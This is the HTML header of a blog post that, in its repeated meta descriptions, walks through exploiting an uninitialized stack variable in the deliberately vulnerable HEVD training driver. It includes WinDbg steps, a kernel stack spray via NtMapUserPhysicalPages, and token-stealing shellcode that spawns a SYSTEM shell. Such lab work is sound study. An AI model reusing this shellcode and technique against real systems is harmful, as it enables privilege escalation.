<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
  <meta name="generator" content="Jekyll">

  <title>Windows Kernel Exploitation 0x05 | Uninitialized Stack Variable [eng]</title>

  <link rel="stylesheet" href="/css/main.css">
  <!-- <link href="assets/favicon.ico" rel="icon" type="image/x-icon" /> -->
  <link rel="shortcut icon" type="image/png" href="assets//favicon.png">
  <link href="/atom.xml" type="application/atom+xml" rel="alternate" title="ATOM Feed" /> <!-- Begin Jekyll SEO tag v2.8.0 -->
<title>Windows Kernel Exploitation 0x05 Uninitialized Stack Variable [eng] | Windows Internals Blog</title>
<meta name="generator" content="Jekyll v4.3.3" />
<meta property="og:title" content="Windows Kernel Exploitation 0x05 Uninitialized Stack Variable [eng]" />
<meta name="author" content="truebad0ur" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="website with original article another one and another one :) When a developer defines a variable but doesn’t initialize it, Uninitialized Stack Variable vulnerability arises. During runtime, the variable would have some value, even though an unpredictable one. Code analysis from the original We can clearly see that in secure way we initialize the variable with zero, in insecure we don’t. #ifdef SECURE // // Secure Note: This is secure because the developer is properly initializing // UNINITIALIZED_MEMORY_STACK to NULL and checks for NULL pointer before calling // the callback // UNINITIALIZED_MEMORY_STACK UninitializedMemory = { 0 }; #else // // Vulnerability Note: This is a vanilla Uninitialized Memory in Stack vulnerability // because the developer is not initializing &#39;UNINITIALIZED_MEMORY_STACK&#39; structure // before calling the callback when &#39;MagicValue&#39; does not match &#39;UserValue&#39; // UNINITIALIZED_MEMORY_STACK UninitializedMemory; #endif And also we can see that later the uninitialized variable is called in callback function PAGE:00014F59 PAGE:00014F59 loc_14F59: ; CODE XREF: TriggerUninitializedStackVariable(x)+4D↑j PAGE:00014F59 push [ebp+UninitializedStackVariable.Value] PAGE:00014F5F push offset aUninitializeds_0 ; &quot;[+] UninitializedStackVariable.Value: 0&quot;... PAGE:00014F64 call _DbgPrint PAGE:00014F69 push [ebp+UninitializedStackVariable.Callback] PAGE:00014F6F push offset aUninitializeds_1 ; &quot;[+] UninitializedStackVariable.Callback&quot;... PAGE:00014F74 call _DbgPrint PAGE:00014F79 push offset aTriggeringUnin ; &quot;[+] Triggering Uninitialized Stack Vari&quot;... PAGE:00014F7E call _DbgPrint PAGE:00014F83 add esp, 14h PAGE:00014F86 cmp [ebp+UninitializedStackVariable.Callback], edi PAGE:00014F8C jz short loc_14FB7 PAGE:00014F8E call [ebp+UninitializedStackVariable.Callback] &lt;-- here we call it PAGE:00014F94 jmp short loc_14FB7 Same here as in the previous one, we should pass anything except for magic number that is given in the program to get into out vulnerable part Let’s go to the exploit Exploit run windbg run virutal machine open shared folder on vm (Z:\kernel4\NullPoint\Release in my case) to copy compiled file to the desktop in windbg: ed nt!Kd_Default_Mask 8 .sympath+ C:\Users\truebad0ur\Documents\Kernel .reload /f lm m HEV* - check if out module is loaded bp HEVD!TriggerUninitializedStackVariable - break on out function bp HEVD!TriggerUninitializedStackVariable+94 - break on the end of the function before shellcode call #include &lt;Windows.h&gt; #include &lt;string.h&gt; #include &lt;stdio.h&gt; #define IO_CODE 0x22202F const char kDevName[] = &quot;\\\\.\\HackSysExtremeVulnerableDriver&quot;; int main() { printf(&quot;[+] Calling CreateFileA() to obtain a handle to driver\n&quot;); HANDLE hDevice = CreateFileA(kDevName, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL ); if (hDevice == INVALID_HANDLE_VALUE) { printf(&quot;[-] Error - dailed to get file handle!\n&quot;); system(&quot;pause&quot;); return -1; } printf(&quot;[+] Successfully obtained a handle to the driver\n&quot;); DWORD bytesRetn; char buf[4] = { 0xb0, 0xb0, 0xd0, 0xba }; printf(&quot;[+] Starting interaction with the driver\n&quot;); DeviceIoControl(hDevice, IO_CODE, buf, sizeof(buf), NULL, 0, &amp;bytesRetn, NULL); //system(&quot;cmd.exe&quot;); CloseHandle(hDevice); return 0; } Everything works fine, we see [+] UserValue: 0xBAD0B0B0 [+] UninitializedStackVariable Address: 0xA98CB9A8 [+] UninitializedStackVariable.Value: 0xBAD0B0B0 [+] UninitializedStackVariable.Callback: 0xA7F57EE8 [+] Triggering Uninitialized Stack Variable Vulnerability [+] Uninitialized Stack Variable Object Callback Changed value to check [+] UserValue: 0xDDCCBBAA [+] UninitializedStackVariable Address: 0x821C99A8 [+] UninitializedStackVariable.Value: 0x92607BE5 [+] UninitializedStackVariable.Callback: 0x85413D10 [+] Triggering Uninitialized Stack Variable Vulnerability kd&gt; dps esp 821c9984 a7f58abc HEVD! ?? ::NNGAKEGL::`string&#39; 821c9988 a7f58af8 HEVD! ?? ::NNGAKEGL::`string&#39; 821c998c 85413d10 821c9990 a7f58b28 HEVD! ?? ::NNGAKEGL::`string&#39; 821c9994 92607be5 dxgkrnl!DpQueueDpc+0x72 821c9998 25e9f97e 821c999c 86f63c98 821c99a0 86f63d08 821c99a4 a7f58ca4 HEVD! ?? ::NNGAKEGL::`string&#39; 821c99a8 92607be5 dxgkrnl!DpQueueDpc+0x72 821c99ac 85413d10 This will trigger callback in vulnurable function. Now we somehow need to control that callback function address to call our shellcode. To do this, the steps we need to follow: Find the kernel stack init address Find the offset of our callback from this init address Spray the Kernel Stack with User controlled input from the user mode. (Good read about it can be found here by j00ru). To find the kernel stack init address, run the !thread command, and then offset = stack init address - callback function address kd&gt; !thread THREAD 87265788 Cid 05a8.084c Teb: 7ffdf000 Win32Thread: 00000000 RUNNING on processor 0 IRP List: 86f63c98: (0006,0094) Flags: 00060000 Mdl: 00000000 Not impersonating DeviceMap 8f592d88 Owning Process 85036d28 Image: Project1.exe Attached Process N/A Image: N/A Wait Start TickCount 85644 Ticks: 18 (0:00:00:00.180) Context Switch Count 44 IdealProcessor: 0 UserTime 00:00:00.000 KernelTime 00:00:00.300 Win32 Start Address 0x00e9134f Stack Init 821c9ed0 &lt;--------- kd&gt; ?821c9ed0 - 821c99ac Evaluate expression: 1316 = 00000524 To spray stack we’ll be using NtMapUserPhysicalPages BOOL WINAPI MapUserPhysicalPages( _In_ PVOID lpAddress, _In_ ULONG_PTR NumberOfPages, _In_ PULONG_PTR UserPfnArray ); With this API we can spray upto 1024 * sizeof(ULONG_PTR), more than our offset, so okay. Spray kernel stack with 0x414141… // Thanks h0mbre for the code #include &lt;Windows.h&gt; #include &lt;winternl.h&gt; #include &lt;stdio.h&gt; // // Defining just our driver name that it uses for IoCreateDevice and also the IOCTL code we use to reach our vulnerable function #define DEVICE_NAME &quot;\\\\.\\HackSysExtremeVulnerableDriver&quot; #define IOCTL 0x22202F // // Here we are creating a prototype of the NtMapUserPhysicalPages, we are using the struct member types that tekwizz123 uses, I couldn&#39;t get any other definition to work typedef NTSTATUS(WINAPI* _NtMapUserPhysicalPages)( PINT BaseAddress, UINT32 NumberOfPages, PBYTE PageFrameNumbers); // // This function simply retrieves a handle to HEVD, this should be standard at this point based on our previous exploits; however, you can see how much easier it is // to use Visual C++ and have access to the keywords vs. finding constants for these values and using Python C-types HANDLE Get_Handle() { HANDLE HEVD = CreateFileA(DEVICE_NAME, FILE_READ_ACCESS | FILE_WRITE_ACCESS, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_FLAG_OVERLAPPED | FILE_ATTRIBUTE_NORMAL, NULL); if (HEVD == INVALID_HANDLE_VALUE) { printf(&quot;[!] Unable to retrieve handle for HEVD, last error: %d\n&quot;, GetLastError()); exit(1); } printf(&quot;[*] Successfully retrieved handle to HEVD: %X\n&quot;, HEVD); return HEVD; } void Spawn_Shell() { PROCESS_INFORMATION Process_Info; ZeroMemory(&amp;Process_Info, sizeof(Process_Info)); STARTUPINFOA Startup_Info; ZeroMemory(&amp;Startup_Info, sizeof(Startup_Info)); Startup_Info.cb = sizeof(Startup_Info); CreateProcessA(&quot;C:\\Windows\\System32\\cmd.exe&quot;, NULL, NULL, NULL, 0, CREATE_NEW_CONSOLE, NULL, NULL, &amp;Startup_Info, &amp;Process_Info); } int main() { HANDLE HEVD = Get_Handle(); // Just a dummy buffer so that we don&#39;t match the keyword value for BAD0B0B0 char Input_Buffer[] = &quot;\x41\x41\x41\x41&quot;; // Acutally creating an instance of our typedef by typcasting the result of a GetProcAddress call inside of ntdll.dll for &#39;NtMapUserPhysicalPages&#39; (Thanks tekwizz!) _NtMapUserPhysicalPages NtMapUserPhysicalPages = (_NtMapUserPhysicalPages)GetProcAddress(GetModuleHandleA(&quot;ntdll.dll&quot;), &quot;NtMapUserPhysicalPages&quot;); // Token stealing payload straight from b33f&#39;s FuzzySec blogpost char Shellcode[] = ( &quot;\x60&quot; &quot;\x64\xA1\x24\x01\x00\x00&quot; &quot;\x8B\x40\x50&quot; &quot;\x89\xC1&quot; &quot;\x8B\x98\xF8\x00\x00\x00&quot; &quot;\xBA\x04\x00\x00\x00&quot; &quot;\x8B\x80\xB8\x00\x00\x00&quot; &quot;\x2D\xB8\x00\x00\x00&quot; &quot;\x39\x90\xB4\x00\x00\x00&quot; &quot;\x75\xED&quot; &quot;\x8B\x90\xF8\x00\x00\x00&quot; &quot;\x89\x91\xF8\x00\x00\x00&quot; &quot;\x61&quot; &quot;\xC3&quot; ); // Allocate a RWX buffer the size of our shellcode LPVOID Shellcode_Addr = VirtualAlloc(NULL, sizeof(Shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); // Copying our shellcode buffer into our RWX buffer printf(&quot;[*] Allocating RWX shellcode at: %X\n&quot;, Shellcode_Addr); memcpy(Shellcode_Addr, Shellcode, sizeof(Shellcode)); // This var is going to be a pointer to the address of Shellcode_Addr, this will end up being the value we spray on the stack LPVOID Spray_Address = &amp;Shellcode_Addr; printf(&quot;[*] Our address to spray on the stack: %X\n&quot;, Spray_Address); // This var will be used as our BaseAddress in our NtMapPhysicalPages API call int Zero = 0; // We will typecast this to a PBYTE and reference its address when calling NtMapPhysicalPages char Page_Frame_Numbers[4096] = { 0 }; // This for loop will take our 4096 character array and fill it with the Spray_Address value for (int i = 0; i &lt; 1024; i++) { memcpy((Page_Frame_Numbers + (i * 4)), Spray_Address, 4); } // Calling the API finally, thanks again, tekwizz printf(&quot;[*] Spraying stack and triggering vulnerability...\n&quot;); NtMapUserPhysicalPages(&amp;Zero, 1024, (PBYTE)&amp;Page_Frame_Numbers); DWORD Dummy_Bytes = 0; // Trigger bug DeviceIoControl(HEVD, 0x22202F, &amp;Input_Buffer, sizeof(Input_Buffer), NULL, 0, &amp;Dummy_Bytes, NULL); printf(&quot;[*] Spawning nt/authority system cmd.exe shell...\n&quot;); Spawn_Shell(); return 0; } The main idea is very simple: if we provide something else except for 0xBAD0B0B0, we’ll not set UninitializedStackVariable.Callback = UninitializedStackVariableObjectCallback; and Callback will be called not initialized from the stack (that means something that is aligned in the stack, some junk) And we spray the stack with out address so out shellcode will be called as a callback. Don’t know why, but if we put the breakpoint on the start of the function, exploit wouldn’t work We should delete it and leave just bp HEVD!TriggerUninitializedStackVariable+94 In this case we’ll see: ... 9758bf8e ff95f8feffff call dword ptr [ebp-108h] ss:0010:ac9c59ac=001d0000 ... kd&gt; !thread ... Stack Init ac9c5ed0 ... kd&gt; ?ac9c5ed0-0x524 Evaluate expression: -1399039572 = kd&gt; dd ac9c59ac L1 ac9c59ac 001d0000 We see out address of the shellcode kd&gt; u 001d0000 001d0000 60 pushad 001d0001 64a124010000 mov eax,dword ptr fs:[00000124h] 001d0007 8b4050 mov eax,dword ptr [eax+50h] 001d000a 89c1 mov ecx,eax" />
<meta property="og:description" content="website with original article another one and another one :) When a developer defines a variable but doesn’t initialize it, Uninitialized Stack Variable vulnerability arises. During runtime, the variable would have some value, even though an unpredictable one. Code analysis from the original We can clearly see that in secure way we initialize the variable with zero, in insecure we don’t. #ifdef SECURE // // Secure Note: This is secure because the developer is properly initializing // UNINITIALIZED_MEMORY_STACK to NULL and checks for NULL pointer before calling // the callback // UNINITIALIZED_MEMORY_STACK UninitializedMemory = { 0 }; #else // // Vulnerability Note: This is a vanilla Uninitialized Memory in Stack vulnerability // because the developer is not initializing &#39;UNINITIALIZED_MEMORY_STACK&#39; structure // before calling the callback when &#39;MagicValue&#39; does not match &#39;UserValue&#39; // UNINITIALIZED_MEMORY_STACK UninitializedMemory; #endif And also we can see that later the uninitialized variable is called in callback function PAGE:00014F59 PAGE:00014F59 loc_14F59: ; CODE XREF: TriggerUninitializedStackVariable(x)+4D↑j PAGE:00014F59 push [ebp+UninitializedStackVariable.Value] PAGE:00014F5F push offset aUninitializeds_0 ; &quot;[+] UninitializedStackVariable.Value: 0&quot;... PAGE:00014F64 call _DbgPrint PAGE:00014F69 push [ebp+UninitializedStackVariable.Callback] PAGE:00014F6F push offset aUninitializeds_1 ; &quot;[+] UninitializedStackVariable.Callback&quot;... PAGE:00014F74 call _DbgPrint PAGE:00014F79 push offset aTriggeringUnin ; &quot;[+] Triggering Uninitialized Stack Vari&quot;... PAGE:00014F7E call _DbgPrint PAGE:00014F83 add esp, 14h PAGE:00014F86 cmp [ebp+UninitializedStackVariable.Callback], edi PAGE:00014F8C jz short loc_14FB7 PAGE:00014F8E call [ebp+UninitializedStackVariable.Callback] &lt;-- here we call it PAGE:00014F94 jmp short loc_14FB7 Same here as in the previous one, we should pass anything except for magic number that is given in the program to get into out vulnerable part Let’s go to the exploit Exploit run windbg run virutal machine open shared folder on vm (Z:\kernel4\NullPoint\Release in my case) to copy compiled file to the desktop in windbg: ed nt!Kd_Default_Mask 8 .sympath+ C:\Users\truebad0ur\Documents\Kernel .reload /f lm m HEV* - check if out module is loaded bp HEVD!TriggerUninitializedStackVariable - break on out function bp HEVD!TriggerUninitializedStackVariable+94 - break on the end of the function before shellcode call #include &lt;Windows.h&gt; #include &lt;string.h&gt; #include &lt;stdio.h&gt; #define IO_CODE 0x22202F const char kDevName[] = &quot;\\\\.\\HackSysExtremeVulnerableDriver&quot;; int main() { printf(&quot;[+] Calling CreateFileA() to obtain a handle to driver\n&quot;); HANDLE hDevice = CreateFileA(kDevName, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL ); if (hDevice == INVALID_HANDLE_VALUE) { printf(&quot;[-] Error - dailed to get file handle!\n&quot;); system(&quot;pause&quot;); return -1; } printf(&quot;[+] Successfully obtained a handle to the driver\n&quot;); DWORD bytesRetn; char buf[4] = { 0xb0, 0xb0, 0xd0, 0xba }; printf(&quot;[+] Starting interaction with the driver\n&quot;); DeviceIoControl(hDevice, IO_CODE, buf, sizeof(buf), NULL, 0, &amp;bytesRetn, NULL); //system(&quot;cmd.exe&quot;); CloseHandle(hDevice); return 0; } Everything works fine, we see [+] UserValue: 0xBAD0B0B0 [+] UninitializedStackVariable Address: 0xA98CB9A8 [+] UninitializedStackVariable.Value: 0xBAD0B0B0 [+] UninitializedStackVariable.Callback: 0xA7F57EE8 [+] Triggering Uninitialized Stack Variable Vulnerability [+] Uninitialized Stack Variable Object Callback Changed value to check [+] UserValue: 0xDDCCBBAA [+] UninitializedStackVariable Address: 0x821C99A8 [+] UninitializedStackVariable.Value: 0x92607BE5 [+] UninitializedStackVariable.Callback: 0x85413D10 [+] Triggering Uninitialized Stack Variable Vulnerability kd&gt; dps esp 821c9984 a7f58abc HEVD! ?? ::NNGAKEGL::`string&#39; 821c9988 a7f58af8 HEVD! ?? ::NNGAKEGL::`string&#39; 821c998c 85413d10 821c9990 a7f58b28 HEVD! ?? ::NNGAKEGL::`string&#39; 821c9994 92607be5 dxgkrnl!DpQueueDpc+0x72 821c9998 25e9f97e 821c999c 86f63c98 821c99a0 86f63d08 821c99a4 a7f58ca4 HEVD! ?? ::NNGAKEGL::`string&#39; 821c99a8 92607be5 dxgkrnl!DpQueueDpc+0x72 821c99ac 85413d10 This will trigger callback in vulnurable function. Now we somehow need to control that callback function address to call our shellcode. To do this, the steps we need to follow: Find the kernel stack init address Find the offset of our callback from this init address Spray the Kernel Stack with User controlled input from the user mode. (Good read about it can be found here by j00ru). To find the kernel stack init address, run the !thread command, and then offset = stack init address - callback function address kd&gt; !thread THREAD 87265788 Cid 05a8.084c Teb: 7ffdf000 Win32Thread: 00000000 RUNNING on processor 0 IRP List: 86f63c98: (0006,0094) Flags: 00060000 Mdl: 00000000 Not impersonating DeviceMap 8f592d88 Owning Process 85036d28 Image: Project1.exe Attached Process N/A Image: N/A Wait Start TickCount 85644 Ticks: 18 (0:00:00:00.180) Context Switch Count 44 IdealProcessor: 0 UserTime 00:00:00.000 KernelTime 00:00:00.300 Win32 Start Address 0x00e9134f Stack Init 821c9ed0 &lt;--------- kd&gt; ?821c9ed0 - 821c99ac Evaluate expression: 1316 = 00000524 To spray stack we’ll be using NtMapUserPhysicalPages BOOL WINAPI MapUserPhysicalPages( _In_ PVOID lpAddress, _In_ ULONG_PTR NumberOfPages, _In_ PULONG_PTR UserPfnArray ); With this API we can spray upto 1024 * sizeof(ULONG_PTR), more than our offset, so okay. Spray kernel stack with 0x414141… // Thanks h0mbre for the code #include &lt;Windows.h&gt; #include &lt;winternl.h&gt; #include &lt;stdio.h&gt; // // Defining just our driver name that it uses for IoCreateDevice and also the IOCTL code we use to reach our vulnerable function #define DEVICE_NAME &quot;\\\\.\\HackSysExtremeVulnerableDriver&quot; #define IOCTL 0x22202F // // Here we are creating a prototype of the NtMapUserPhysicalPages, we are using the struct member types that tekwizz123 uses, I couldn&#39;t get any other definition to work typedef NTSTATUS(WINAPI* _NtMapUserPhysicalPages)( PINT BaseAddress, UINT32 NumberOfPages, PBYTE PageFrameNumbers); // // This function simply retrieves a handle to HEVD, this should be standard at this point based on our previous exploits; however, you can see how much easier it is // to use Visual C++ and have access to the keywords vs. finding constants for these values and using Python C-types HANDLE Get_Handle() { HANDLE HEVD = CreateFileA(DEVICE_NAME, FILE_READ_ACCESS | FILE_WRITE_ACCESS, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_FLAG_OVERLAPPED | FILE_ATTRIBUTE_NORMAL, NULL); if (HEVD == INVALID_HANDLE_VALUE) { printf(&quot;[!] Unable to retrieve handle for HEVD, last error: %d\n&quot;, GetLastError()); exit(1); } printf(&quot;[*] Successfully retrieved handle to HEVD: %X\n&quot;, HEVD); return HEVD; } void Spawn_Shell() { PROCESS_INFORMATION Process_Info; ZeroMemory(&amp;Process_Info, sizeof(Process_Info)); STARTUPINFOA Startup_Info; ZeroMemory(&amp;Startup_Info, sizeof(Startup_Info)); Startup_Info.cb = sizeof(Startup_Info); CreateProcessA(&quot;C:\\Windows\\System32\\cmd.exe&quot;, NULL, NULL, NULL, 0, CREATE_NEW_CONSOLE, NULL, NULL, &amp;Startup_Info, &amp;Process_Info); } int main() { HANDLE HEVD = Get_Handle(); // Just a dummy buffer so that we don&#39;t match the keyword value for BAD0B0B0 char Input_Buffer[] = &quot;\x41\x41\x41\x41&quot;; // Acutally creating an instance of our typedef by typcasting the result of a GetProcAddress call inside of ntdll.dll for &#39;NtMapUserPhysicalPages&#39; (Thanks tekwizz!) _NtMapUserPhysicalPages NtMapUserPhysicalPages = (_NtMapUserPhysicalPages)GetProcAddress(GetModuleHandleA(&quot;ntdll.dll&quot;), &quot;NtMapUserPhysicalPages&quot;); // Token stealing payload straight from b33f&#39;s FuzzySec blogpost char Shellcode[] = ( &quot;\x60&quot; &quot;\x64\xA1\x24\x01\x00\x00&quot; &quot;\x8B\x40\x50&quot; &quot;\x89\xC1&quot; &quot;\x8B\x98\xF8\x00\x00\x00&quot; &quot;\xBA\x04\x00\x00\x00&quot; &quot;\x8B\x80\xB8\x00\x00\x00&quot; &quot;\x2D\xB8\x00\x00\x00&quot; &quot;\x39\x90\xB4\x00\x00\x00&quot; &quot;\x75\xED&quot; &quot;\x8B\x90\xF8\x00\x00\x00&quot; &quot;\x89\x91\xF8\x00\x00\x00&quot; &quot;\x61&quot; &quot;\xC3&quot; ); // Allocate a RWX buffer the size of our shellcode LPVOID Shellcode_Addr = VirtualAlloc(NULL, sizeof(Shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); // Copying our shellcode buffer into our RWX buffer printf(&quot;[*] Allocating RWX shellcode at: %X\n&quot;, Shellcode_Addr); memcpy(Shellcode_Addr, Shellcode, sizeof(Shellcode)); // This var is going to be a pointer to the address of Shellcode_Addr, this will end up being the value we spray on the stack LPVOID Spray_Address = &amp;Shellcode_Addr; printf(&quot;[*] Our address to spray on the stack: %X\n&quot;, Spray_Address); // This var will be used as our BaseAddress in our NtMapPhysicalPages API call int Zero = 0; // We will typecast this to a PBYTE and reference its address when calling NtMapPhysicalPages char Page_Frame_Numbers[4096] = { 0 }; // This for loop will take our 4096 character array and fill it with the Spray_Address value for (int i = 0; i &lt; 1024; i++) { memcpy((Page_Frame_Numbers + (i * 4)), Spray_Address, 4); } // Calling the API finally, thanks again, tekwizz printf(&quot;[*] Spraying stack and triggering vulnerability...\n&quot;); NtMapUserPhysicalPages(&amp;Zero, 1024, (PBYTE)&amp;Page_Frame_Numbers); DWORD Dummy_Bytes = 0; // Trigger bug DeviceIoControl(HEVD, 0x22202F, &amp;Input_Buffer, sizeof(Input_Buffer), NULL, 0, &amp;Dummy_Bytes, NULL); printf(&quot;[*] Spawning nt/authority system cmd.exe shell...\n&quot;); Spawn_Shell(); return 0; } The main idea is very simple: if we provide something else except for 0xBAD0B0B0, we’ll not set UninitializedStackVariable.Callback = UninitializedStackVariableObjectCallback; and Callback will be called not initialized from the stack (that means something that is aligned in the stack, some junk) And we spray the stack with out address so out shellcode will be called as a callback. Don’t know why, but if we put the breakpoint on the start of the function, exploit wouldn’t work We should delete it and leave just bp HEVD!TriggerUninitializedStackVariable+94 In this case we’ll see: ... 9758bf8e ff95f8feffff call dword ptr [ebp-108h] ss:0010:ac9c59ac=001d0000 ... kd&gt; !thread ... Stack Init ac9c5ed0 ... kd&gt; ?ac9c5ed0-0x524 Evaluate expression: -1399039572 = kd&gt; dd ac9c59ac L1 ac9c59ac 001d0000 We see out address of the shellcode kd&gt; u 001d0000 001d0000 60 pushad 001d0001 64a124010000 mov eax,dword ptr fs:[00000124h] 001d0007 8b4050 mov eax,dword ptr [eax+50h] 001d000a 89c1 mov ecx,eax" />
<meta property="og:site_name" content="Windows Internals Blog" />
<meta property="og:image" content="/assets/previews/15.jpg" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2022-11-10T00:00:00+00:00" />
<meta name="twitter:card" content="summary_large_image" />
<meta property="twitter:image" content="/assets/previews/15.jpg" />
<meta property="twitter:title" content="Windows Kernel Exploitation 0x05 Uninitialized Stack Variable [eng]" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"truebad0ur"},"dateModified":"2022-11-10T00:00:00+00:00","datePublished":"2022-11-10T00:00:00+00:00","description":"website with original article another one and another one :) When a developer defines a variable but doesn’t initialize it, Uninitialized Stack Variable vulnerability arises. During runtime, the variable would have some value, even though an unpredictable one. Code analysis from the original We can clearly see that in secure way we initialize the variable with zero, in insecure we don’t. #ifdef SECURE // // Secure Note: This is secure because the developer is properly initializing // UNINITIALIZED_MEMORY_STACK to NULL and checks for NULL pointer before calling // the callback // UNINITIALIZED_MEMORY_STACK UninitializedMemory = { 0 }; #else // // Vulnerability Note: This is a vanilla Uninitialized Memory in Stack vulnerability // because the developer is not initializing &#39;UNINITIALIZED_MEMORY_STACK&#39; structure // before calling the callback when &#39;MagicValue&#39; does not match &#39;UserValue&#39; // UNINITIALIZED_MEMORY_STACK UninitializedMemory; #endif And also we can see that later the uninitialized variable is called in callback function PAGE:00014F59 PAGE:00014F59 loc_14F59: ; CODE XREF: TriggerUninitializedStackVariable(x)+4D↑j PAGE:00014F59 push [ebp+UninitializedStackVariable.Value] PAGE:00014F5F push offset aUninitializeds_0 ; &quot;[+] UninitializedStackVariable.Value: 0&quot;... PAGE:00014F64 call _DbgPrint PAGE:00014F69 push [ebp+UninitializedStackVariable.Callback] PAGE:00014F6F push offset aUninitializeds_1 ; &quot;[+] UninitializedStackVariable.Callback&quot;... PAGE:00014F74 call _DbgPrint PAGE:00014F79 push offset aTriggeringUnin ; &quot;[+] Triggering Uninitialized Stack Vari&quot;... PAGE:00014F7E call _DbgPrint PAGE:00014F83 add esp, 14h PAGE:00014F86 cmp [ebp+UninitializedStackVariable.Callback], edi PAGE:00014F8C jz short loc_14FB7 PAGE:00014F8E call [ebp+UninitializedStackVariable.Callback] &lt;-- here we call it PAGE:00014F94 jmp short loc_14FB7 Same here as in the previous one, we should pass anything except for magic number that is given in the program to get into out vulnerable part Let’s go to the exploit Exploit run windbg run virutal machine open shared folder on vm (Z:\\kernel4\\NullPoint\\Release in my case) to copy compiled file to the desktop in windbg: ed nt!Kd_Default_Mask 8 .sympath+ C:\\Users\\truebad0ur\\Documents\\Kernel .reload /f lm m HEV* - check if out module is loaded bp HEVD!TriggerUninitializedStackVariable - break on out function bp HEVD!TriggerUninitializedStackVariable+94 - break on the end of the function before shellcode call #include &lt;Windows.h&gt; #include &lt;string.h&gt; #include &lt;stdio.h&gt; #define IO_CODE 0x22202F const char kDevName[] = &quot;\\\\\\\\.\\\\HackSysExtremeVulnerableDriver&quot;; int main() { printf(&quot;[+] Calling CreateFileA() to obtain a handle to driver\\n&quot;); HANDLE hDevice = CreateFileA(kDevName, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL ); if (hDevice == INVALID_HANDLE_VALUE) { printf(&quot;[-] Error - dailed to get file handle!\\n&quot;); system(&quot;pause&quot;); return -1; } printf(&quot;[+] Successfully obtained a handle to the driver\\n&quot;); DWORD bytesRetn; char buf[4] = { 0xb0, 0xb0, 0xd0, 0xba }; printf(&quot;[+] Starting interaction with the driver\\n&quot;); DeviceIoControl(hDevice, IO_CODE, buf, sizeof(buf), NULL, 0, &amp;bytesRetn, NULL); //system(&quot;cmd.exe&quot;); CloseHandle(hDevice); return 0; } Everything works fine, we see [+] UserValue: 0xBAD0B0B0 [+] UninitializedStackVariable Address: 0xA98CB9A8 [+] UninitializedStackVariable.Value: 0xBAD0B0B0 [+] UninitializedStackVariable.Callback: 0xA7F57EE8 [+] Triggering Uninitialized Stack Variable Vulnerability [+] Uninitialized Stack Variable Object Callback Changed value to check [+] UserValue: 0xDDCCBBAA [+] UninitializedStackVariable Address: 0x821C99A8 [+] UninitializedStackVariable.Value: 0x92607BE5 [+] UninitializedStackVariable.Callback: 0x85413D10 [+] Triggering Uninitialized Stack Variable Vulnerability kd&gt; dps esp 821c9984 a7f58abc HEVD! ?? ::NNGAKEGL::`string&#39; 821c9988 a7f58af8 HEVD! ?? ::NNGAKEGL::`string&#39; 821c998c 85413d10 821c9990 a7f58b28 HEVD! ?? ::NNGAKEGL::`string&#39; 821c9994 92607be5 dxgkrnl!DpQueueDpc+0x72 821c9998 25e9f97e 821c999c 86f63c98 821c99a0 86f63d08 821c99a4 a7f58ca4 HEVD! ?? ::NNGAKEGL::`string&#39; 821c99a8 92607be5 dxgkrnl!DpQueueDpc+0x72 821c99ac 85413d10 This will trigger callback in vulnurable function. Now we somehow need to control that callback function address to call our shellcode. To do this, the steps we need to follow: Find the kernel stack init address Find the offset of our callback from this init address Spray the Kernel Stack with User controlled input from the user mode. (Good read about it can be found here by j00ru). To find the kernel stack init address, run the !thread command, and then offset = stack init address - callback function address kd&gt; !thread THREAD 87265788 Cid 05a8.084c Teb: 7ffdf000 Win32Thread: 00000000 RUNNING on processor 0 IRP List: 86f63c98: (0006,0094) Flags: 00060000 Mdl: 00000000 Not impersonating DeviceMap 8f592d88 Owning Process 85036d28 Image: Project1.exe Attached Process N/A Image: N/A Wait Start TickCount 85644 Ticks: 18 (0:00:00:00.180) Context Switch Count 44 IdealProcessor: 0 UserTime 00:00:00.000 KernelTime 00:00:00.300 Win32 Start Address 0x00e9134f Stack Init 821c9ed0 &lt;--------- kd&gt; ?821c9ed0 - 821c99ac Evaluate expression: 1316 = 00000524 To spray stack we’ll be using NtMapUserPhysicalPages BOOL WINAPI MapUserPhysicalPages( _In_ PVOID lpAddress, _In_ ULONG_PTR NumberOfPages, _In_ PULONG_PTR UserPfnArray ); With this API we can spray upto 1024 * sizeof(ULONG_PTR), more than our offset, so okay. Spray kernel stack with 0x414141… // Thanks h0mbre for the code #include &lt;Windows.h&gt; #include &lt;winternl.h&gt; #include &lt;stdio.h&gt; // // Defining just our driver name that it uses for IoCreateDevice and also the IOCTL code we use to reach our vulnerable function #define DEVICE_NAME &quot;\\\\\\\\.\\\\HackSysExtremeVulnerableDriver&quot; #define IOCTL 0x22202F // // Here we are creating a prototype of the NtMapUserPhysicalPages, we are using the struct member types that tekwizz123 uses, I couldn&#39;t get any other definition to work typedef NTSTATUS(WINAPI* _NtMapUserPhysicalPages)( PINT BaseAddress, UINT32 NumberOfPages, PBYTE PageFrameNumbers); // // This function simply retrieves a handle to HEVD, this should be standard at this point based on our previous exploits; however, you can see how much easier it is // to use Visual C++ and have access to the keywords vs. finding constants for these values and using Python C-types HANDLE Get_Handle() { HANDLE HEVD = CreateFileA(DEVICE_NAME, FILE_READ_ACCESS | FILE_WRITE_ACCESS, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_FLAG_OVERLAPPED | FILE_ATTRIBUTE_NORMAL, NULL); if (HEVD == INVALID_HANDLE_VALUE) { printf(&quot;[!] Unable to retrieve handle for HEVD, last error: %d\\n&quot;, GetLastError()); exit(1); } printf(&quot;[*] Successfully retrieved handle to HEVD: %X\\n&quot;, HEVD); return HEVD; } void Spawn_Shell() { PROCESS_INFORMATION Process_Info; ZeroMemory(&amp;Process_Info, 